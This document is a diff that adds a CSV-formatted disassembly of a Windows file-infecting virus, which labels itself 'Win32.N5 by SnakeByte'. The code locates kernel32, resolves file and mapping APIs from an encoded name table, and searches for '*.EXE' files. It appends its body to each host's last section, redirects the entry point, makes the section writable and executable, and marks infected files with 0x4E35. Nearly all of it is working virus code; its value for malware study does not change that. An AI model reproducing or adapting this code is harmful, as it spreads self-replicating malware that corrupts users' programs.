@@ -1,0 +1,520 @@
+Opcode,Operand,Comment
+model,flat,
+CODE,segment,para public 'CODE' use32
+assume,cs:CODE,
+assume,"es:nothing,","ss:nothing, ds:nothing, fs:nothing, gs:nothing"
+public,start,
+start,proc,near
+var_4,=,dword	ptr -4
+nop,,
+nop,,
+nop,,
+nop,,
+nop,,
+nop,,
+loc_412693:,;,DATA XREF: sub_412B59+140r
+call,$+5,
+loc_412698:,;,DATA XREF: start+116A0o
+mov,"ecx,",[esp+4+var_4]
+add,"esp,",4
+mov,"ebp,",ecx
+sub,"ebp,",offset loc_412698
+jmp,loc_412D90,
+start,endp,
+dword_4126AB,dd,0			; DATA XREF: CODE:00412DAFw
+dword_4126AF,dd,0			; DATA XREF: sub_412CC8+32w
+dword_4126B3,dd,0			; DATA XREF: sub_412ADF+4r
+dword_4126B7,dd,8 dup(0)		; DATA XREF: sub_412903+7o
+dword_4126D7,dd,0			; DATA XREF: sub_412B59+15r
+dd,2,dup(0)
+dword_4126E3,dd,0			; DATA XREF: sub_41291E+1r
+dd,45h,dup(0)
+db,2,dup(0)
+dword_4127FD,dd,0			; DATA XREF: sub_412A27+29w
+dword_412801,dd,0			; DATA XREF: CODE:0041296Fw
+dword_412805,dd,0			; DATA XREF: sub_412A27+Fw
+dword_412809,dd,0			; DATA XREF: CODE:004129A7r
+dword_41280D,dd,0			; DATA XREF: CODE:00412A0Ar
+aWin32_n5BySnak,db,"'Win32.N5 by SnakeByte',0"
+dword_412827,dd,0			; DATA XREF: sub_412B59+2r
+dword_41282B,dd,0			; DATA XREF: sub_412B59+CCw
+dword_41282F,dd,0			; DATA XREF: CODE:00412969r
+dword_412833,dd,0			; DATA XREF: sub_412B59+39w
+dword_412837,dd,0			; DATA XREF: CODE:00412B27w
+dword_41283B,dd,0			; DATA XREF: sub_412D0A+24w
+dword_41283F,dd,0			; DATA XREF: sub_412A27+2Fw
+dword_412843,dd,0			; DATA XREF: sub_412ADF+10w
+dword_412847,dd,6572430Bh		; DATA XREF: CODE:004129E2r
+dd,"46657461h,","41656C69h, 6D6E550Fh, 69567061h, 664F7765h"
+dd,"656C6946h,","6E69460Dh, 78654E64h, 6C694674h, 4D0D4165h"
+dd,"69567061h,","664F7765h, 656C6946h, 6E694609h, 6F6C4364h"
+dd,"43126573h,","74616572h, 6C694665h, 70614D65h, 676E6970h"
+dd,"6C430B41h,","4865736Fh, 6C646E61h, 69460E65h, 6946646Eh"
+dd,"46747372h,",41656C69h
+dword_4128B7,dd,0			; DATA XREF: sub_412903+Dr
+dword_4128BB,dd,0			; DATA XREF: CODE:0041299Cr
+dword_4128BF,dd,0			; DATA XREF: CODE:004129BDw
+dword_4128C3,dd,0			; DATA XREF: CODE:0041295Dr
+dword_4128C7,dd,0			; DATA XREF: CODE:00412975r
+dword_4128CB,dd,58452E2Ah		; DATA XREF: CODE:00412B0Bo
+db,"65h,",0
+dword_4128D1,dd,0			; DATA XREF: CODE:004129EAo
+dword_4128D5,dd,0			; DATA XREF: sub_412D77+6r
+dword_4128D9,dd,0			; DATA XREF: sub_412903+14r
+dword_4128DD,dd,0			; DATA XREF: sub_412D0A+47r
+dword_4128E1,dd,0			; DATA XREF: CODE:00412B4Er
+dword_4128E5,dd,0			; DATA XREF: sub_412D0A+1Er
+dword_4128E9,dd,0			; DATA XREF: sub_412D64+Br
+dword_4128ED,dd,0			; DATA XREF: sub_412938+Er
+word_4128F1,dw,0			; DATA XREF: CODE:004129F7w
+dword_4128F3,dd,0			; DATA XREF: sub_412A27+23w
+dword_4128F7,dd,0			; DATA XREF: CODE:004129CBw
+dword_4128FB,dd,0			; DATA XREF: CODE:004129DCw
+dword_4128FF,dd,0			; DATA XREF: sub_412ADF+Ar
+sub_412903,proc,near		; CODE XREF: CODE:00412B3Dp
+call,sub_41291E,
+mov,"eax,",ebp
+add,"eax,",offset dword_4126B7
+push,eax,
+mov,"ebx,",ss:dword_4128B7[ebp]
+push,ebx,
+call,ss:dword_4128D9[ebp],
+retn,,
+sub_412903,endp,
+sub_41291E,proc,near		; CODE XREF: sub_412903p sub_412938p
+pusha,,
+lea,"ecx,",dword_4126E3[ebp]
+mov,"eax,",133h
+sub,"eax,",1Fh
+loc_41292D:,;,CODE XREF: sub_41291E+16j
+mov,byte,"ptr [ecx],	0"
+sub,"ecx,",0FFFFFFFFh
+dec,eax,
+jnz,short,loc_41292D
+popa,,
+retn,,
+sub_41291E,endp,
+sub_412938,proc,near		; CODE XREF: CODE:00412B12p
+call,sub_41291E,
+mov,"eax,",ebp
+add,"eax,",offset dword_4126B7
+push,eax,
+push,ebx,
+call,ss:dword_4128ED[ebp],
+mov,"ss:dword_4128B7[ebp],",0
+add,"ss:dword_4128B7[ebp],",eax
+retn,,
+sub_412938,endp,
+loc_41295D:,;,CODE XREF: CODE:00412DC0j
+push,ss:dword_4128C3[ebp],
+pop,ss:dword_41298C[ebp],
+push,ss:dword_41282F[ebp],
+pop,ss:dword_412801[ebp],
+push,ss:dword_4128C7[ebp],
+pop,ss:dword_412986[ebp],
+loc_412981:,;,CODE XREF: sub_412A27+B3j
+test,"ebp,",ebp
+jz,short,loc_412992
+db,0B9h,; ¹
+dword_412986,dd,0			; DATA XREF: CODE:0041297Bw
+db,"81h,",0C1h
+dword_41298C,dd,0			; DATA XREF: CODE:00412963w
+jmp,ecx,
+loc_412992:,;,CODE XREF: CODE:00412983j
+push,0,
+call,ExitProcess,
+loc_412999:,;,DATA XREF: CODE:00412E0Fr
+push,8,
+pop,ecx,
+mov,"edi,",ss:dword_4128BB[ebp]
+xor,"edx,",edx
+add,"edx,",[edi+78h]
+add,"edx,",ss:dword_412809[ebp]
+inc,edx,
+add,"edx,",1Bh
+mov,"edi,",[edx]
+dec,edx,
+add,"edx,",5
+add,"edi,",ss:dword_412809[ebp]
+mov,"ss:dword_4128BF[ebp],",edi
+mov,"edi,",[edx]
+add,"edi,",ss:dword_412809[ebp]
+mov,"ss:dword_4128F7[ebp],",edi
+add,"edx,",4
+mov,"edi,",[edx]
+add,"edi,",ss:dword_412809[ebp]
+mov,"ss:dword_4128FB[ebp],",edi
+lea,"ebx,",dword_412847[ebp]
+mov,"esi,",ebp
+add,"esi,",offset dword_4128D1
+loc_4129F0:,;,CODE XREF: CODE:00412A1Aj
+sub,"eax,",eax
+mov,"al,",[ebx]
+add,"ebx,",1
+mov,"ss:word_4128F1[ebp],",0
+call,sub_412A27,
+push,ebx,
+add,"[esp],",eax
+pop,ebx,
+push,ss:dword_41280D[ebp],
+pop,edx,
+mov,"[esi],",edx
+dec,esi,
+add,"esi,",5
+sub,"ecx,",1
+jnz,short,loc_4129F0
+sub,"edx,",3B64C1Fh
+jmp,loc_412B09,
+sub_412A27,proc,near		; CODE XREF: CODE:00412A00p
+pusha,,
+xor,"ecx,",ecx
+inc,ss:dword_41282F[ebp],
+add,"ecx,",ss:dword_4128F7[ebp]
+loc_412A36:,;,CODE XREF: sub_412A27+7Cj
+mov,"ss:dword_412805[ebp],",ecx
+mov,"edx,",[ecx]
+add,"edx,",ss:dword_412809[ebp]
+sub,"ecx,",ecx
+add,"ecx,",edx
+mov,"edi,",ecx
+mov,"ss:dword_4128F3[ebp],",eax
+mov,"ss:dword_4127FD[ebp],",edi
+mov,"ss:dword_41283F[ebp],",ebx
+cld,,
+loc_412A5D:,;,CODE XREF: sub_412A27+4Dj
+mov,"dh,",[ebx]
+cmp,"dh,",[edi]
+jnz,short,loc_412A76
+mov,"edx,",0
+add,"edx,",1
+sub,"eax,",edx
+cmp,"eax,",0
+jz,short,loc_412AA5
+inc,edi,
+inc,ebx,
+jmp,short,loc_412A5D
+loc_412A76:,;,CODE XREF: sub_412A27+3Aj
+mov,"ebx,",ss:dword_41283F[ebp]
+mov,"edi,",ss:dword_4127FD[ebp]
+mov,"eax,",ss:dword_4128F3[ebp]
+mov,"ecx,",ss:dword_412805[ebp]
+add,"ecx,",4
+inc,ss:word_4128F1[ebp],
+cmp,"ss:word_4128F1[ebp],",2003h
+jz,short,loc_412AD8
+jmp,short,loc_412A36
+loc_412AA5:,;,CODE XREF: sub_412A27+49j
+push,0,
+pop,edx,
+mov,"dx,",ss:word_4128F1[ebp]
+or,"ecx,",ebx
+clc,,
+rcl,"edx,",1
+add,"edx,",ss:dword_4128FB[ebp]
+xchg,"edx,",ecx
+movzx,"edx,",word ptr [ecx]
+shl,"edx,",2
+add,"edx,",ss:dword_4128BF[ebp]
+mov,"ecx,",[edx]
+add,"ecx,",ss:dword_412809[ebp]
+mov,"ss:dword_41280D[ebp],",ecx
+popa,,
+retn,,
+loc_412AD8:,;,CODE XREF: sub_412A27+7Aj
+pop,esi,
+popa,,
+jmp,loc_412981,
+sub_412A27,endp,
+sub_412ADF,proc,near		; CODE XREF: sub_412B59+2Ep
+pusha,,
+and,"edx,",0
+mov,"eax,",ss:dword_4126B3[ebp]
+mov,"ebx,",ss:dword_4128FF[ebp]
+mov,"ss:dword_412843[ebp],",eax
+div,ebx,
+sub,"ebx,",edx
+mov,"eax,",ss:dword_412843[ebp]
+add,"eax,",ebx
+mov,"ss:dword_4126B3[ebp],",eax
+popa,,
+retn,,
+sub_412ADF,endp,
+loc_412B09:,;,CODE XREF: CODE:00412A22j
+adc,"eax,",ebx
+mov,"ebx,",offset dword_4128CB
+add,"ebx,",ebp
+call,sub_412938,
+add,"eax,",1
+cmp,"eax,",0
+jz,short,loc_412B47
+mov,"ecx,",38h
+sub,"ecx,",24h
+mov,"ss:dword_412837[ebp],",ecx
+loc_412B2D:,;,CODE XREF: CODE:00412B45j
+call,sub_412E1D,
+mov,"ebx,",ss:dword_412837[ebp]
+cmp,"ebx,",0
+jz,short,loc_412B47
+call,sub_412903,
+cmp,"eax,",0
+jnz,short,loc_412B2D
+loc_412B47:,;,CODE XREF: CODE:00412B1Dj
+mov,"esi,",ss:dword_4128B7[ebp]
+push,esi,
+call,ss:dword_4128E1[ebp],
+jmp,loc_412981,
+sub_412B59,proc,near		; CODE XREF: sub_412E1D+59p
+shr,"ebx,",1
+mov,"eax,",ss:dword_412827[ebp]
+mov,"esi,",[eax+3Ch]
+add,"esi,",eax
+add,"esi,",3Ch
+mov,"ecx,",[esi]
+sub,"esi,",3Ch
+push,ss:dword_4126D7[ebp],
+pop,edx,
+mov,"ss:dword_4128FF[ebp],",ecx
+add,"edx,",7F0h
+mov,"ss:dword_4126B3[ebp],",edx
+call,sub_412ADF,
+mov,"edx,",ss:dword_4126B3[ebp]
+mov,"ss:dword_412833[ebp],",0
+add,"ss:dword_412833[ebp],",edx
+pusha,,
+call,sub_412D77,
+popa,,
+push,edx,
+pop,ss:dword_4126D7[ebp],
+call,sub_412D0A,
+jb,loc_412CC6,
+sub,"eax,",ebx
+push,ss:dword_412827[ebp],
+pop,esi,
+mov,"ebx,",[esi+3Ch]
+add,"ebx,",esi
+mov,"ss:dword_41282F[ebp],",937286h
+mov,"esi,",ebx
+and,"eax,",0
+mov,"ax,",[esi+6]
+dec,eax,
+sub,"eax,",0
+imul,"eax,",28h
+add,"ebx,",78h
+add,"ebx,",eax
+mov,"ecx,",[esi+74h]
+shl,"ecx,",3
+add,"ebx,",ecx
+mov,"eax,",[esi+34h]
+mov,"ss:dword_4128C7[ebp],",eax
+mov,"eax,",[esi+28h]
+mov,"ss:dword_4128C3[ebp],",eax
+mov,"eax,",[ebx+10h]
+sub,"edx,",edx
+add,"edx,",eax
+add,"ebx,",14h
+add,"eax,",[ebx]
+or,"ecx,",15978A1h
+sub,"ebx,",14h
+push,eax,
+push,edx,
+pop,ecx,
+add,"ebx,",0Ch
+add,"ecx,",[ebx]
+sub,"ebx,",0Ch
+mov,"[esi+28h],",ecx
+mov,"ss:dword_41282B[ebp],",ecx
+mov,"ecx,",[ebx+10h]
+push,ecx,
+add,"ecx,",7F0h
+mov,"ss:dword_4126B3[ebp],",ecx
+mov,"ss:dword_41282F[ebp],",1639255h
+push,dword,ptr [esi+3Ch]
+pop,ss:dword_4128FF[ebp],
+call,sub_412ADF,
+mov,"ecx,",ss:dword_4126B3[ebp]
+mov,dword,"ptr [ebx+10h], 0"
+add,"[ebx+10h],",ecx
+pop,ecx,
+add,"ecx,",408h
+add,"ecx,",3E8h
+mov,dword,"ptr [ebx+8], 0"
+add,"[ebx+8],",ecx
+mov,"ecx,",[ebx+10h]
+add,"ecx,",[ebx+0Ch]
+mov,"[esi+50h],",ecx
+or,dword,"ptr [ebx+24h], 0A0000020h"
+mov,dword,"ptr [esi+4Ch], 0"
+add,dword,"ptr [esi+4Ch], 4E35h"
+pop,edi,
+lea,"esi,",loc_412693[ebp]
+mov,"edx,",7F0h
+add,"edi,",ss:dword_412827[ebp]
+loc_412CAA:,;,CODE XREF: sub_412B59+153j
+movsb,,
+dec,edx,
+jnz,short,loc_412CAA
+mov,"eax,",ss:dword_412837[ebp]
+mov,"ebx,",0FFFFFFEEh
+add,"ebx,",13h
+sub,"eax,",ebx
+mov,"ss:dword_412837[ebp],",eax
+clc,,
+retn,,
+loc_412CC6:,;,CODE XREF: sub_412B59+5Cj
+stc,,
+retn,,
+sub_412B59,endp,
+sub_412CC8,proc,near		; CODE XREF: sub_412E1Dp
+push,0,
+push,0,
+push,3,
+push,0,
+neg,ebx,
+push,1,
+add,"edx,",31DEDE2h
+mov,"edx,",0C0000000h
+push,edx,
+mov,"edi,",offset dword_4126E3
+add,"edi,",ebp
+push,edi,
+call,ss:dword_4128D1[ebp],
+add,"eax,",1
+jz,loc_412D75,
+sub,"eax,",1
+mov,"ss:dword_4126AF[ebp],",eax
+mov,"ss:dword_41282F[ebp],",1790431h
+sub_412CC8,endp,
+sub_412D0A,proc,near		; CODE XREF: sub_412B59+57p
+push,ss:dword_4126D7[ebp],
+add,"ecx,",91C546h
+pop,edx,
+push,edx,
+push,0,
+push,edx,
+push,0,
+dec,ecx,
+push,4,
+push,0,
+push,ss:dword_4126AF[ebp],
+call,ss:dword_4128E5[ebp],
+mov,"ss:dword_41283B[ebp],",eax
+pop,edx,
+mov,"edi,",eax
+cmp,"edi,",0
+jz,short,loc_412D69
+push,0,
+pop,eax,
+push,edx,
+push,eax,
+push,eax,
+mov,"ecx,",26h
+xor,"ecx,",24h
+push,ecx,
+push,ss:dword_41283B[ebp],
+call,ss:dword_4128DD[ebp],
+or,"eax,",eax
+jz,short,sub_412D64
+push,eax,
+pop,ss:dword_412827[ebp],
+clc,,
+retn,,
+sub_412D0A,endp,
+sub_412D64,proc,near		; CODE XREF: sub_412D0A+4Fj
+call,sub_412D77,
+loc_412D69:,;,CODE XREF: sub_412D0A+30j
+push,ss:dword_4126AF[ebp],
+call,ss:dword_4128E9[ebp],
+loc_412D75:,;,CODE XREF: sub_412CC8+29j
+stc,,
+retn,,
+sub_412D64,endp,
+sub_412D77,proc,near		; CODE XREF: sub_412B59+4Ap
+push,ss:dword_412827[ebp],
+call,ss:dword_4128D5[ebp],
+push,ss:dword_41283B[ebp],
+call,ss:dword_4128E9[ebp],
+retn,,
+sub_412D77,endp,
+loc_412D90:,;,CODE XREF: start+116A6j
+mov,"eax,",[esp]
+mov,"edi,",ss:dword_4128C7[ebp]
+mov,"ss:dword_412986[ebp],",edi
+mov,"ecx,",ss:dword_4128C3[ebp]
+mov,"ss:dword_41298C[ebp],",ecx
+mov,"ax,",0
+mov,"ss:dword_4126AB[ebp],",5
+loc_412DB9:,;,CODE XREF: CODE:00412DE9j
+cmp,"ss:dword_4126AB[ebp],",0
+jz,loc_41295D,
+movzx,"ebx,",word ptr [eax]
+xor,"ebx,",5A4Dh
+jz,short,loc_412DEB
+loc_412DD1:,;,CODE XREF: CODE:00412E01j
+add,"ss:dword_41282F[ebp],",eax
+add,"eax,",0FFFF0000h
+inc,ss:dword_4126AB[ebp],
+sub,"ss:dword_4126AB[ebp],",2
+jmp,short,loc_412DB9
+loc_412DEB:,;,CODE XREF: CODE:00412DCFj
+add,"eax,",3Ch
+mov,"edi,",[eax]
+dec,eax,
+sub,"eax,",3Bh
+neg,eax,
+sub,"edi,",eax
+neg,eax,
+cmp,word,"ptr [edi],	4550h"
+jz,short,loc_412E03
+jmp,short,loc_412DD1
+loc_412E03:,;,CODE XREF: CODE:00412DFFj
+mov,"ss:dword_412809[ebp],",eax
+mov,"ss:dword_4128BB[ebp],",edi
+lea,"ebx,",loc_412999[ebp]
+push,ebx,
+xor,"ss:dword_41282F[ebp],",ecx
+retn,,
+sub_412E1D,proc,near		; CODE XREF: CODE:00412B2Dp
+call,sub_412CC8,
+jb,short,locret_412E82
+sub,"edx,",edx
+add,"edx,",ss:dword_412827[ebp]
+cmp,word,"ptr [edx],	5A4Dh"
+jz,short,loc_412E3E
+and,"ss:dword_41282F[ebp],",eax
+push,0,
+pop,ecx,
+jz,short,loc_412E7D
+loc_412E3E:,;,CODE XREF: sub_412E1D+14j
+cmp,word,"ptr [edx+3Ch], 0"
+jnz,short,loc_412E47
+jmp,short,loc_412E7D
+loc_412E47:,;,CODE XREF: sub_412E1D+26j
+sub,"edi,",edi
+add,"edi,",[edx+3Ch]
+cmp,"edi,",ss:dword_4126D7[ebp]
+ja,short,loc_412E7D
+add,"edi,",edx
+cmp,word,"ptr [edi],	4550h"
+jz,short,loc_412E6D
+mov,"ebx,",9643h
+sub,"ebx,",10h
+cmp,"ebx,",9633h
+jz,short,loc_412E7D
+loc_412E6D:,;,CODE XREF: sub_412E1D+3Ej
+cmp,dword,"ptr [edi+4Ch], 4E35h"
+jz,short,loc_412E7D
+call,sub_412B59,
+jb,short,locret_412E82
+loc_412E7D:,;,CODE XREF: sub_412E1D+1Fj
+call,sub_412D64,
+locret_412E82:,;,CODE XREF: sub_412E1D+5j
+retn,,
+sub_412E1D,endp,
+align,200h,
+CODE,ends,
+DATA,segment,para public 'DATA' use32
+assume,cs:DATA,
+align,2000h,
+DATA,ends,
+extrn,__imp_ExitProcess:dword,;	DATA XREF: ExitProcessr
+end,start,
